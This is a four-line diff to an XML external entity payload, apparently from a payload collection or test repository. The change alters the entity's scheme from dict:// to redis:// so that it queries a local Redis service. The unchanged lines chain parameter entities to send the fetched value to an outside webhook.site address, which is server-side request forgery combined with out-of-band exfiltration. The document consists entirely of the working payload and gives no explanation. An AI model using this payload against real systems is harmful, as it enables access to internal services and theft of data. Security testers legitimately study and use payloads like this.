@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "dict://localhost:6379/get:'id':1">
+<!ENTITY % file SYSTEM "redis://localhost:6379/get:'id':1">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://webhook.site/0664ee43-6e0f-4212-a4cf-4da30c14e15b/?x=%file;'>">
 %eval;
 %exfiltrate;
